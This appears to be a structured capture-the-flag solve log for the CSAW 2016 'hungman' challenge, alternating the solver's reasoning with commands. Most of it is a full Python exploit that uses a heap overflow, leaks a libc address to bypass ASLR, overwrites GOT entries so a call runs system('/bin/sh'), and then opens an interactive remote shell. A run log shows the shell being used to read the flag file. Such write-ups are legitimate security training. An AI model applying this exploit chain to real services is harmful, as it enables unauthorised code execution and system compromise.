[
    {
        "type": "thought",
        "content": "After decompiling the binary I looked mainly at two functions: the one executed at the start of the game, to create the player structure, and the one that handles the game and in particular the \"change name\" functionality, executed after winning the game."
    },
    {
        "type": "execution",
        "content": "r2 -A hungman"
    },
    {
        "type": "thought",
        "content": "Indeed, the vulnerability was there, when changing the name player. The new name is copied in the buffer of the old name, though without reallocating the space. So if the new name is longer than the old one, you can overwrite something on the heap.\n\nWith gdb I tried to see what is on the heap after the name, looking for something interesting to overwrite."
    },
    {
        "type": "execution",
        "content": "gdb hungman"
    },
    {
        "type": "thought",
        "content": "Inside the player structure there is a pointer to the name that looks quite good. By overwriting it, the next \"change name\" would try to write at the overwritten address, providing me a write primitive. At this point I just have to change the right .got.plt entry to execute the system function with /bin/sh as first argument. After a while it looked like strchr was a good candidate.\n\nAt last, I needed an info leak to bypass ASLR, but that was quite easy to find because when changing the player name pointer, the pointed string was printed on stdout, giving me the address of the strchr function."
    },
    {
        "type": "execution",
        "content": "#!/usr/bin/env python2\n# --------------------------------------------------------------------------------------------------\nimport socket\nimport struct\nimport telnetlib\nimport string\n\n\n# --------------------------------------------------------------------------------------------------\ndef recv_until(st):  # receive until you encounter a string\n    ret = \"\"\n    while st not in ret:\n        ret += s.recv(8192)\n\n    return ret\n\n# --------------------------------------------------------------------------------------------------\nif __name__ == \"__main__\":\n    s = socket.create_connection(('pwn.chal.csaw.io', 8003))\n    #s = socket.create_connection(('localhost', 7777))\n    f = s.makefile()                                # associate a file object with socket\n\n    recv_until(\"What's your name?\")                 # eat banner\n\n    s.send( \"A\"*128 + \"\\n\" )                        # set a big name\n    recv_until( \"\\n\" )\n\n    print \"[+] Winning the game once...\"\n\n    for c in string.ascii_lowercase:                # win the game\n        s.send( c + \"\\n\")\n        recv_until( \"\\n\" )\n\n    s.send(' y\\n')                                  # change username\n\n\n    # -------------------------------------------------------------------------\n    # first overflow: Arbitrary read\n    # -------------------------------------------------------------------------\n    ovfl  = \"A\" * 128                               # fill name\n    ovfl += struct.pack(\"<Q\", 0x1122334455667788)   # prevsize (heap meta)\n    ovfl += struct.pack(\"<Q\", 0x1122334455667788)   # size (heap meta)\n    ovfl += struct.pack(\"<L\", 0x200)                # score (must be >64) \n    ovfl += struct.pack(\"<L\", 0x128)                # name length\n    ovfl += struct.pack(\"<Q\", 0x0000000000602018)   # address of .got.free()\n\n    s.send( ovfl + \"\\n\")\n\n    r = recv_until(\"Continue? \")\n    # print list(r)\n    off  = r.find(\"Highest player: \") + len(\"Highest player: \")\n    free = struct.unpack(\"<Q\", r[off:off + 8])[0] & 0x0000ffffffffffff\n\n    print \"[+] Leaking address of free(): \", hex(free)\n\n\n    '''\n    Offsets from my libc:\n        1349: 000000000003f510    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5\n        2230: 0000000000078890   146 FUNC    GLOBAL DEFAULT   13 free@@GLIBC_2.2.5\n        2116: 0000000000020610   458 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5\n        844:  00000000000817c0    65 IFUNC   GLOBAL DEFAULT   13 memset@@GLIBC_2.2.5\n        1880: 0000000000067dd0   518 FUNC    WEAK   DEFAULT   13 setvbuf@@GLIBC_2.2.5\n    '''\n    system     = free - (0x78890 - 0x3f510)\n    libc_start = free - (0x78890 - 0x20610)\n    memset     = free + (0x78890 - 0x817c0)\n    setvbuf    = free - (0x78890 - 0x67dd0)\n\n    '''\n    Offsets from libc-2.23.so:\n        1351: 0000000000045380    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5+\n        2232: 0000000000083a70   460 FUNC    GLOBAL DEFAULT   13 free@@GLIBC_2.2.5\n        2118: 0000000000020740   458 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5\n    '''\n    system     = free - (0x83a70 - 0x45380)\n    libc_start = free - (0x83a70 - 0x20740)\n\n    \n    s.send(' y\\n')                                  # play the game again\n    recv_until(\"\\n\")\n\n    for c in string.ascii_lowercase:                # win the game again\n        s.send( c + \"\\n\")\n        print recv_until( \"\\n\" ),\n\n    print\n    s.send(' y\\n')                                  # change name again\n\n    print \"[+] free() at\", hex(free)\n    print \"[+] system() at\", hex(system)\n    print \"[+] __libc_start_main() at\", hex(libc_start)\n    print \n    print \"[+] Overwriting GOT...\"\n    # -------------------------------------------------------------------------\n    # second overflow: Arbitrary write to GOT\n    # -------------------------------------------------------------------------\n    # 0x400A2E contains a newline\n    #\n    # control flow:\n    #   1. Overflow in memcpy() at 0x400EC4\n    #   2. Hijack control during call to free() at 0400ED0\n    #   3. go to .text:00400D0E call _puts\n    #   4. go to .text:00400920 start proc near\n    #   5. go to main()\n    #\n    #   SOLUTION A:\n    #       6. call setvbuf()  (actually system)\n    #\n    #   SOLUTION B:\n    #       6. call setvbuf() (make it idle; point to retn)\n    #       7. call memset() (actuall system)\n    #\n    # Payload contains both solutions, but only one is used.\n    # \n    ovfl  = struct.pack(\"<Q\", 0x0000000000400D0E)   # free = .text:00400D0E call _puts\n    ovfl += struct.pack(\"<Q\", 0x0000000000400920)   # puts = .text:00400920 start proc near\n    ovfl += \"A\"*8 *5                                # ignore these entries\n    ovfl += struct.pack(\"<Q\", system)               # memset = system\n    ovfl += \"B\" * 8 * 2                             #\n    ovfl += struct.pack(\"<Q\", libc_start)           # recover __libc_start_main\n    ovfl += \"C\" * 8 * 3                             #\n    ovfl += struct.pack(\"<Q\", 0x0000000000400B39)   # setvbuf = .text:00400B39 retn\n    ovfl += \"D\" * 8 * 3                             #\n    ovfl += \"/bin/sh\\x00\" + \"E\" * 16                # .data\n    ovfl += struct.pack(\"<Q\", 0x00) + \"F\" * 56      #\n    ovfl += \"/bin/sh\\x00\" + \"G\" * 8                 #\n    ovfl += struct.pack(\"<Q\", 0x00000000006020A8)   # .data:006020A8 = &/bin/sh\n\n    s.send(ovfl + \"\\n\")\n\n    # -------------------------------------------------------------------------\n    # get shell\n    # ------------------------------------------------------------------------\n    s.send( '`;')                                   # fix backtick problem\n\n    print '[+] Opening Shell...'\n    t = telnetlib.Telnet()                          # try to open shell\n    t.sock = s\n    t.interact()\n\n# --------------------------------------------------------------------------------------------------\n'''\nroot@nogirl:~/ctf/csaw_16# ./hungman_expl.py \n[+] Winning the game once...\n[+] Leaking address of free():  0x7f9776b85a70\n___a__________________________________________________a___________________________________________a__a______________________________a_____________a______________________________________________a_______________________________________________________________________________________________a_____\n___a___________________b______________________________a___________________________________________a__a______b_______________________a__________bb_a___b____________________b___b_________________abb_____b_______b_____b_______________________________________b________b______________b_________ab____\n___a_c___c__c_c________b______________________________a______c_____c______________________c_______a__a______b_______________________a______cc__bb_a___b_____c______________b___b_________________abb_____b____c__b_____b_______________________________________b__c_____b______________b_________ab____\n___a_c___c__c_c____d___b_________________________dd___a_____dc___d_c_____________________dc_______a_da______b____d__________________a______cc__bb_a___b_____c______________b___b_________________abb_____b____c__b____db_______________________________________b__c_____b______________b_________ab____\n___a_c___c__c_c____d___b_________________________dd_e_a_____dce__d_c____________e________dc_______a_da_e____b____d__________________a______cc__bb_a___b_____c______________b___b_________________abb_____b____c__b____db_______________________________________b__c_____b______________b_________ab____\n___a_c___c__c_c____d__fb______f________________f_dd_e_a_____dce__d_c_____f____f_e________dc_______a_da_e____b____d_______________f__a____f_cc__bb_a___b_____c______________b___b___f_____________abb_____b_f__cf_b_f__db____f___________________ff_____________b__c_____b______________b_________ab____\n___a_c___c__c_c____d__fb___gg_f_________g______f_dd_e_a_____dce__d_c_____f_gg_f_e________dc_____g_a_da_e____b____d_____g_________f__a____f_cc__bb_a___b_____c______________b_ggb___f__________g__abb_____b_f__cf_b_f__db____f______________g____ff_____________b__c_____b____________g_b______g__ab____\n___a_c___c__c_c____d__fb___gg_f_________g__h__hf_dd_e_a_____dce__d_c_____f_gg_f_e_h______dc_____g_a_da_e____b____d_____g_________f__a____f_cc__bb_a_h_b_____c______________b_ggb___f__________g__abb____hb_f__cf_b_f__db___hf______________g_h__ff_h___________b__c____hb___h_______hg_b______g__ab____\n___a_c___c__c_c____d__fb___gg_f_i_______g__h__hf_ddie_a___i_dce__d_c___i_f_gg_f_e_h______dc_____g_a_da_e__i_b_i__d_i_i_g_________f__a____f_cc__bb_a_h_b____ic____________i_b_ggb___f_______i__g__abb____hb_fi_cf_b_fi_db___hf______________g_h__ff_h______i___ib__c__i_hb___h_i_____hg_b___i__g_iab_i__\n___a_c___c__c_c____d__fbjjjggjfji_______g__h__hf_ddie_a___i_dce__d_cj__i_f_gg_f_e_h______dc_____gja_da_e__ijb_i__d_i_i_g_________f__a____f_cc_jbb_a_h_b____ic____________i_b_ggb___f_______i__g__abb_j__hb_fijcf_b_fi_db___hf______________g_h__ff_h__jj__i___ib__c__i_hb__jh_i_____hg_b___i__g_iab_i__\n___a_c___c__c_c___kd__fbjjjggjfji_______g__h__hf_ddie_a___i_dce__dkcj__i_f_gg_f_e_h__k___dc_____gja_dake__ijb_i__d_i_i_g_________f__a____f_cc_jbb_a_hkb_k__ic____________i_b_ggb___f___k___i__g__abb_j__hb_fijcf_b_fi_db___hfk_____k___k___g_h__ff_h__jj__i___ib__c__i_hb__jh_i_____hg_b___i__g_iab_i__\n___a_c___c__c_c___kd_lfbjjjggjfji_______g__h__hf_ddie_a___i_dce__dkcjl_i_f_gg_f_e_h__k___dc_____gja_dakel_ijb_i__d_i_i_g____l____f__a____f_cc_jbb_a_hkb_k__icl__l_l______i_b_ggb___f___k___i__g_labb_j__hb_fijcf_b_fi_db___hfk____lk___k___g_h__ff_h__jj__i___ib_lc__i_hb__jh_i_____hg_b___i_lgliab_i__\n___a_c___c__c_c___kd_lfbjjjggjfji_______g__h__hfmddie_a___i_dce__dkcjl_i_fmggmf_e_h__k___dc_____gja_dakel_ijb_i__d_i_i_g___ml_m__f__a____f_ccmjbb_a_hkb_k__icl__l_l______i_b_ggbm__f___k___i__g_labb_j__hb_fijcf_b_fi_db___hfk____lkm__k___g_h__ff_h__jj__i___ib_lc__i_hb__jh_i_____hg_b___i_lgliab_imm\n___a_c___c__c_c___kd_lfbjjjggjfji_______g_nh__hfmddie_ann_i_dce__dkcjlni_fmggmf_e_h__k___dc____ngja_dakelnijb_i__d_i_i_g___mlnm__fn_a____f_ccmjbb_a_hkb_k__icl_nl_l______i_b_ggbm__f___k___i__g_labb_j__hb_fijcf_b_fi_db___hfkn_n_lkm__k___g_h__ff_h__jj__in__ib_lc__i_hb__jh_i_____hg_b___i_lgliab_imm\n__oa_c___c__c_c___kd_lfbjjjggjfji_______g_nh__hfmddie_ann_iodce__dkcjlniofmggmf_e_h__k___dc__o_ngja_dakelnijb_i__d_i_iog___mlnm__fn_a___of_ccmjbboa_hkb_k__icl_nl_l______i_boggbm__f___k___io_g_labb_j__hb_fijcf_b_fi_db___hfkn_n_lkmo_k___g_h__ff_ho_jj__in__ib_lc__i_hb__jh_i_____hg_b___i_lgliaboimm\n__oapc___c__c_c___kd_lfbjjjggjfji_______g_nh__hfmddie_annpiodce__dkcjlniofmggmf_e_h__k__pdc__o_ngjapdakelnijbpi_pd_i_iog___mlnm__fn_a___of_ccmjbboa_hkb_k__icl_nl_l___p__i_boggbmp_f___k___io_g_labb_j__hb_fijcf_b_fi_db___hfkn_n_lkmo_k___g_h__ff_ho_jj__in__ib_lc__i_hb__jh_i_____hg_b___i_lgliaboimm\n_qoapcq_qc__c_c___kd_lfbjjjggjfji_______gqnh__hfmddie_annpiodce_qdkcjlniofmggmf_e_h_qk__pdc__o_ngjapdakelnijbpi_pd_i_iog___mlnm__fn_a_qqof_ccmjbboa_hkb_k__icl_nl_l___p_qi_boggbmp_fqq_k___io_g_labb_jq_hb_fijcf_b_fi_db___hfkn_n_lkmo_k___g_h__ff_hoqjj__in__ib_lc__i_hb__jh_i_____hg_b__qi_lgliaboimm\n_qoapcq_qc__c_c___kd_lfbjjjggjfji__rr___gqnhr_hfmddie_annpiodce_qdkcjlniofmggmf_e_h_qk__pdc__o_ngjapdakelnijbpi_pd_i_iogr_rmlnm_rfn_a_qqof_ccmjbboa_hkb_k__icl_nl_l___p_qi_boggbmp_fqq_k___io_grlabb_jq_hb_fijcfrb_fi_db___hfkn_n_lkmo_k__rg_h__ff_hoqjj__in_rib_lc__i_hb__jh_i____rhg_br_qi_lgliaboimm\n_qoapcq_qc__c_c___kd_lfbjjjggjfji__rr___gqnhr_hfmddie_annpiodce_qdkcjlniofmggmf_e_h_qk__pdc__o_ngjapdakelnijbpi_pdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ks_icl_nl_l___p_qisboggbmpsfqq_k___io_grlabb_jq_hb_fijcfrb_fi_db_s_hfkn_n_lkmosk__rg_h__ffshoqjj_sin_rib_lc__i_hb__jh_i_s__rhg_brsqi_lgliaboimm\n_qoapcq_qc__c_c___kd_lfbjjjggjfji__rrt__gqnhr_hfmddie_annpiodce_qdkcjlniofmggmf_eth_qkt_pdc__o_ngjapdakelnijbpi_pdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ks_icl_nl_l___p_qisboggbmpsfqq_k___io_grlabb_jq_hb_fijcfrb_fi_db_s_hfkntn_lkmosk__rg_h__ffshoqjj_sin_rib_lc__i_hb__jh_i_s__rhg_brsqitlgliaboimm\n_qoapcq_qcu_c_c___kd_lfbjjjggjfji__rrt__gqnhruhfmddie_annpiodceuqdkcjlniofmggmf_eth_qktupdc__oungjapdakelnijbpiupdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ksuicl_nl_l___puqisboggbmpsfqq_k_u_io_grlabb_jq_hb_fijcfrb_fi_db_s_hfkntn_lkmosku_rg_h__ffshoqjjusin_rib_lc__iuhb__jhuiusuurhgubrsqitlgliaboimm\n_qoapcqvqcu_cvcv__kd_lfbjjjggjfjivvrrt__gqnhruhfmddie_annpiodceuqdkcjlniofmggmfveth_qktupdc__oungjapdakelnijbpiupdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ksuicl_nl_l___puqisboggbmpsfqqvkvu_io_grlabb_jq_hbvfijcfrbvfi_db_s_hfkntnvlkmoskuvrg_h_vffshoqjjusin_rib_lc__iuhb__jhuiusuurhgubrsqitlgliaboimm\n_qoapcqvqcu_cvcv__kd_lfbjjjggjfjivvrrt__gqnhruhfmddiewannpiodceuqdkcjlniofmggmfvethwqktupdc__oungjapdakelnijbpiupdsi_iogrwrmlnm_rfnwasqqof_ccmjbboa_hkb_ksuicl_nl_lw__puqisboggbmpsfqqvkvu_io_grlabbwjq_hbvfijcfrbvfi_db_s_hfkntnvlkmoskuvrgwhwvffshoqjjusin_rib_lc__iuhb__jhuiusuurhgubrsqitlgliaboimm\n_qoapcqvqcu_cvcvx_kd_lfbjjjggjfjivvrrtxxgqnhruhfmddiewannpiodceuqdkcjlniofmggmfvethwqktupdcx_oungjapdakelnijbpiupdsi_iogrwrmlnm_rfnwasqqof_ccmjbboa_hkbxksuiclxnl_lwx_puqisboggbmpsfqqvkvu_ioxgrlabbwjq_hbvfijcfrbvfi_db_sxhfkntnvlkmoskuvrgwhwvffshoqjjusinxrib_lc_xiuhb_xjhuiusuurhgubrsqitlgliaboimm\nyqoapcqvqcu_cvcvxykdylfbjjjggjfjivvrrtxxgqnhruhfmddiewannpiodceuqdkcjlniofmggmfvethwqktupdcx_oungjapdakelnijbpiupdsi_iogrwrmlnmyrfnwasqqofyccmjbboa_hkbxksuiclxnlylwxypuqisboggbmpsfqqvkvuyioxgrlabbwjqyhbvfijcfrbvfi_db_sxhfkntnvlkmoskuvrgwhwvffshoqjjusinxribylc_xiuhb_xjhuiusuurhgubrsqitlgliaboimm\nHigh score! change name?\n\n[+] free() at 0x7f9776b85a70\n[+] system() at 0x7f9776b47380\n[+] __libc_start_main() at 0x7f9776b22740\n\n[+] Overwriting GOT...\n[+] Opening Shell...\n    id\n        uid=1000(hungman) gid=1000(hungman) groups=1000(hungman)\n    ls -la\n        total 36\n        drwxr-x---  2 root hungman  4096 Sep 16 21:31 .\n        drwxr-xr-x 10 root root     4096 Sep 16 21:31 ..\n        -rw-r--r--  1 root hungman   220 Sep 16 21:31 .bash_logout\n        -rw-r--r--  1 root hungman  3771 Sep 16 21:31 .bashrc\n        -rw-r--r--  1 root hungman   655 Sep 16 21:31 .profile\n        -rw-rw-r--  1 root root       41 Sep 16 21:13 flag.txt\n        -rwxrwxr-x  1 root root    10464 Sep 16 21:13 hungman\n    cat flag.txt\n        flag{this_looks_like_its_a_well_hungman}\n    exit\n*** Connection closed by remote host ***\n'''\n# --------------------------------------------------------------------------------------------------"
    }
]